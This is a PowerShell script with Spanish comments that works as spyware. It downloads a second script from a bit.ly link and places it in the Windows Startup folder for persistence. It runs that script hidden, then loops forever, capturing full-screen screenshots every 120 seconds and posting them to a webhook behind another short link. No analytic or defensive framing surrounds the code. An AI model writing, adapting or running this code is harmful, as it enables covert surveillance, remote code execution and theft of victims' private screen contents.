# URL de descarga del script sysw.ps1
$url = "https://bit.ly/Screen_dc"

# Ruta de destino para el script sysw.ps1
$outputPath = "$env:temp\sysw.ps1"

# Descargar el script desde la URL proporcionada
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Ruta de destino para el script en el directorio de inicio del usuario actual
$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.ps1"

# Copiar el script al directorio de inicio del usuario actual para que se ejecute al iniciar Windows
Copy-Item -Path $outputPath -Destination $destination -Force

# Ejecutar el script de manera oculta al iniciar Windows
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File '$destination'"

# URL del webhook principal
$mainWebhookUrl = "https://bit.ly/web_chupakbras"
$seconds = 120  # Intervalo de captura de pantalla en segundos
$numberOfScreenshots = 3  # Cantidad de capturas de pantalla a enviar

# Función para tomar y enviar capturas de pantalla
function TakeAndSendScreenshots {
    $TempFolder = "$env:temp\sysw"
    
    # Crea la carpeta temporal si no existe
    if (-not (Test-Path -Path $TempFolder)) {
        New-Item -ItemType Directory -Path $TempFolder | Out-Null
    }
    
    # Obtiene la resolución de la pantalla
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    
    # Toma las capturas de pantalla y las envía al webhook
    for ($i = 1; $i -le $numberOfScreenshots; $i++) {
        $Filett = "$TempFolder\SC$i.png"
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
        Start-Sleep 1
        
        try {
            Write-Host "Enviando imagen $i..."
            Invoke-RestMethod -Uri $mainWebhookUrl -Method Post -InFile $Filett
            Remove-Item -Path $Filett -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Error al enviar la imagen $i al webhook: $_"
        }
    }
}

# Ejecutar la función para tomar y enviar capturas de pantalla cada 120 segundos
while ($true) {
    TakeAndSendScreenshots
    Start-Sleep -Seconds $seconds
}
